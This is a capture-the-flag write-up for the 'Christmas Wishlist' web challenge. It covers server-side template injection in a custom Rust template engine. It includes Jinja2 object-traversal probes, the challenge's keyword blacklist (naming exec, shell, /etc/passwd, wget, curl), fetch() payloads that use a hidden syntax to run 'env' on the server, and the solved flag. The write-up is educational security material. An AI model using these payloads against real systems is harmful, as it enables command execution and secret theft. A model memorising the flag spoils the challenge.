# Christmas Wishlist

## Challenge Information

**Description:** Santa has built a new wishlist application! Send your Christmas wishes now!

**Category:** Web

**Difficulty:** Easy

**Challenge URL:** http://52.76.163.244:8080

**Disclaimer: This might be my longest writeup skskskskskskskk**

---

### Initial Thoughts

Upon visiting the challenge URL, I was greeted with a festive Christmas-themed web application featuring:

- A form with three input fields:
  - **Name** (text input)
  - **Christmas Wish** (textarea)
  - **Custom Template** (textarea with default template)
- Example template expressions mentioned:
  - `{{santa}}`, `{{tree}}`, `{{gift}}`, `{{snowman}}`, `{{star}}` - Christmas emojis
  - `{{name.upper}}` - Transform to uppercase
  - `{{name.reverse}}` - Reverse text
  - `{{wish.len}}` - Count characters

![web](https://github.com/candypopZZ/ctf-writeup/blob/main/images/santa.png?raw=true)

### Key Hint from the Page

The page contained an important hint:

> *"🔍 Hint: Santa's workshop has some powerful template features for the elves... Legend says there's a special syntax related to where Santa lives. The senior elves use advanced expressions, but Santa's security team tries to block dangerous keywords. 🎅✨"*

**My Analysis:**
- "Special syntax related to where Santa lives" → Santa lives at the **North Pole**
- "Senior elves use advanced expressions" → Suggests hidden/advanced features
- "Security team tries to block dangerous keywords" → Indicates a blacklist filter

---

## Assumptions & Failed Tests

### Assumption 1: XSS Vulnerability

**Initial Thought:** My first instinct was that this might be a Cross-Site Scripting (XSS) challenge involving JWT tokens or cookies.

**Why I thought this:** The page had JavaScript handling form submissions and rendering results.

**Verdict:** ❌ **Wrong assumption** - This turned out to be a Server-Side Template Injection (SSTI) challenge, not XSS.

---

### Test Series 1: Basic SSTI Detection

#### Test 1: Mathematical Expression
**Assumption:** If this is Jinja2/Flask SSTI, `{{7*7}}` should evaluate to `49`.

**Payload:**
- Name: `Test`
- Wish: `Testing`
- Custom Template: `{{7*7}}`

**Result:**
```
Template error: Unknown variable: 7*7
```

**Analysis:** The template engine doesn't auto-evaluate mathematical expressions. It's treating `7*7` as a variable name, not an expression.

---

#### Test 2: Basic Variable Rendering
**Assumption:** Let's confirm basic template variable substitution works.

**Payload:**
- Name: `Test`
- Wish: `Testing`
- Custom Template: `{{name}}`

**Result:**
```
Test
```

**Analysis:** ✅ Basic variable substitution works!

---

#### Test 3: Multiple Variables
**Payload:**
- Name: `Test`
- Wish: `Testing`
- Custom Template: `Dear Santa, {{name}} wants {{wish}}`

**Result:**
```
Dear Santa, Test wants Testing
```

**Analysis:** ✅ Multiple variable substitution confirmed working.

---

### Test Series 2: Attempting Jinja2 Exploitation

#### Test 4: Jinja2 For Loop
**Assumption:** Maybe we can use Jinja2 loop syntax to iterate through objects.

**Payload:**
- Name: `Test`
- Wish: `Testing`
- Custom Template: `{% for item in name.__class__.__mro__ %}{{item}}{% endfor %}`

**Result:**
```
Template error: Unknown variable: item
```

**Analysis:** ❌ The `{% %}` statement syntax doesn't work. Either it's not Jinja2 or loop statements are blocked.

---

### Test Series 3: Python Object Traversal Attempts

#### Test 5-9: Attempting Class Access
**Assumption:** In Python-based template engines, we can access the object hierarchy via `__class__`, `__mro__`, `__base__`, etc.

**Payloads Tested:**
```
{{name.__class__}}
{{name.__class__.__mro__}}
{{name.__class__.__base__}}
{{name.__class__.__base__.__subclasses__()}}
{{self}}
```

**Result:** All returned:
```
Template error: Unknown filter
```

**Analysis:** ❌ Direct attribute access with `__` (double underscores) is blocked or not supported.

---

### Test Series 4: Alternative Access Methods

#### Test 10: Bracket Notation
**Assumption:** Maybe we can bypass the filter using dictionary-style access.

**Payload:**
- Custom Template: `{{name['__class__']}}`

**Result:**
```
Template error: Unknown filter
```

**Analysis:** ❌ Bracket notation also blocked.

---

#### Test 11: Request Object
**Assumption:** Flask/Jinja2 often exposes a `request` object.

**Payload:**
- Custom Template: `{{request}}`

**Result:**
```
Template error: Unknown variable
```

**Analysis:** ❌ No `request` object available.

---

#### Test 12-14: Other Global Objects
**Payloads Tested:**
```
{{globals}}
{{lipsum}}
{{cycler}}
{{joiner}}
```

**Result:** All returned template errors.

**Analysis:** ❌ Standard Jinja2 global objects not available.

---

### Test Series 5: Direct Flag Access

#### Test 15: Direct Flag Variable
**Assumption:** Sometimes CTFs expose the flag directly as a template variable.

**Payload:**
- Custom Template: `{{flag}}`

**Result:**
```
Template error: Suspicious template detected! Santa's security elves are watching! 🎅🚨
```

**Analysis:** 🎯 **BREAKTHROUGH!** This confirms:
1. There's a blacklist filter checking for suspicious keywords
2. The word "flag" is blacklisted
3. We're on the right track!

---

#### Test 16: Testing Other Blacklisted Words
**Payloads Tested:**
```
{{secret}}
{{config}}
{{env}}
```

**Results:**
- `{{secret}}` → "Suspicious template detected!"
- `{{config}}` → "Template error: Unknown variable"
- `{{env}}` → "Template error: Unknown variable"

**Analysis:** Words like "flag" and "secret" are explicitly blacklisted.

---

### Test Series 6: Exploring Available Variables

#### Test 17: Christmas Emoji Variables
**Assumption:** The hint mentioned `{{santa}}`, `{{tree}}`, etc. work. Let's see what they return.

**Payload:**
- Custom Template: `{{santa}} {{tree}} {{gift}} {{snowman}} {{star}}`

**Result:**
```
🎅 🎄 🎁 ⛄ ⭐
```

**Analysis:** These are just emoji strings, not exploitable objects.

---

## Major Breakthrough: Source Code Discovery

At this point, I downloaded the challenge source files and found the actual implementation! (why i didnt do this earlier lol)

### Source Code Analysis

**File:** `main.rs` (Rust/Actix-web application)

**Key Findings:**

1. **Custom Template Engine:** This isn't Jinja2 or any standard template engine - it's a custom Rust implementation!

2. **Blacklist Filter:**
```rust
fn is_suspicious(&self, template: &str) -> bool {
    let suspicious_patterns = [
        "exec", "system", "command", "shell", "eval", "import", 
        "require", "FLAG", "flag", "secret", "/proc", "/etc/passwd", 
        "cat ", "ls ", "wget", "curl"
    ];
    // ...
}
```

3. **Two Template Syntaxes:**
   - Regular: `{{variable}}` - For basic variable substitution
   - Special: `{$north_pole expression $}` - **Hidden advanced syntax!**

4. **Special Expression Capabilities:**
```rust
fn evaluate_special(&self, expr: &str) -> Result<String, String> {
    // Environment variables
    if expr.starts_with("env.") || expr.starts_with("getenv.") { ... }
    
    // File reading
    if expr.starts_with("read:") || expr.starts_with("file:") { ... }
    
    // Command execution
    if expr.starts_with("run:") || expr.starts_with("cmd:") { ... }
    
    // Math expressions
    if expr.contains('+') || expr.contains('-') || expr.contains('*') { ... }
}
```

5. **Flag Location:**
```yaml
# docker-compose.yml
environment:
  - FLAG=HEX{dummy_flag}
```

The flag is stored as an environment variable!

---

## The "North Pole" Connection

**The Hint Finally Makes Sense:**
- "Legend says there's a special syntax related to where Santa lives"
- Santa lives at the **North Pole**
- The special syntax is: `{$north_pole ... $}`

This syntax was hidden in the source code and **NOT** blocked by the blacklist filter!

---

## Exploitation

### Test 18: File Reading Attempt (Failed)
**First Attempt:** I tried reading files using variable substitution.

**Payload:**
```javascript
fetch("/wish", { 
    method: "POST", 
    headers: {"Content-Type": "application/json"}, 
    body: JSON.stringify({ 
        name: "/", 
        wish: "x", 
        template: "Output: {$north_pole read:{{name}} $}" 
    }) 
}).then(r => r.json()).then(console.log)
```

**Result:**
```
Template error: Cannot read file: No such file or directory (os error 2)
```

**Analysis:** The `{{name}}` evaluated to "/" which isn't a valid file. Wrong approach.

---

### Test 19: Environment Variable Access (SUCCESS!)

**Final Payload:**
```javascript
fetch("/wish", { 
    method: "POST", 
    headers: {"Content-Type": "application/json"}, 
    body: JSON.stringify({ 
        name: "Test", 
        wish: "Testing", 
        template: "{$north_pole run:env $}" 
    }) 
}).then(r => r.json()).then(console.log)
```

**Alternatively, through the web form:**
- Name: `Test`
- Wish: `Testing`
- Custom Template: `{$north_pole run:env $}`

**Result:**
```
HOSTNAME=6441850c7c8c
HOME=/home/santa
RUST_LOG=info
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/app
FLAG=HEX{s4nt4s_m4g1c_t3mpl4t3_l34k5_s3cr3ts}
```

---

## Flag
```
HEX{s4nt4s_m4g1c_t3mpl4t3_l34k5_s3cr3ts}
```

![flag](https://github.com/candypopZZ/ctf-writeup/blob/main/images/santa.png?raw=true)

---

## Solution Summary

### Vulnerability Type
**Server-Side Template Injection (SSTI)** in a custom Rust template engine.

### Exploitation Path
1. Identified template injection through basic variable substitution
2. Discovered blacklist filter by triggering "Suspicious template" errors
3. Found source code revealing the hidden `{$north_pole ... $}` syntax
4. Used `{$north_pole run:env $}` to execute shell command and list environment variables
5. Retrieved flag from `FLAG` environment variable

### Key Techniques
- Template injection testing
- Blacklist enumeration
- Source code analysis
- Command execution via special syntax
- Environment variable extraction

---

## Lessons Learned

1. **Read Hints Carefully:** The "North Pole" hint was a direct reference to the special syntax `{$north_pole ... $}`

2. **Custom Template Engines:** Not all SSTI challenges use Jinja2/Flask. Custom implementations may have unique syntax and vulnerabilities.

3. **Blacklist Bypasses:** The special syntax bypassed the blacklist because the filter only checked for keywords in the main template pattern `{{...}}`, not in `{$north_pole ... $}`

4. **Environment Variables:** In containerized applications (Docker), environment variables are a common place to store sensitive data and flags.

5. **Source Code = Gold:** Having access to source code dramatically speeds up exploitation by revealing:
   - Exact blacklist patterns
   - Hidden features and syntax
   - Flag location and storage method

6. **Persistence Pays Off:** Even when initial assumptions (XSS, standard SSTI) were wrong, methodical testing revealed the actual vulnerability.

---

## Tools Used

- Web Browser (Chrome/Firefox DevTools)
- Browser Console for `fetch()` API calls
- Text editor for source code analysis

---

## References

- [OWASP: Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks: SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

## Timeline

1. **Initial reconnaissance** - Analyzed page structure and hints
2. **Failed XSS assumption** - Realized it wasn't client-side vulnerability
3. **SSTI testing phase** - Tested various template injection payloads
4. **Blacklist discovery** - Found "flag" and "secret" were blocked
5. **Source code analysis** - Downloaded and analyzed main.rs
6. **"North Pole" revelation** - Connected hint to special syntax
7. **Successful exploitation** - Used `{$north_pole run:env $}` to get flag

**Total Time:** ~2 hours (including all failed attempts and source code analysis)
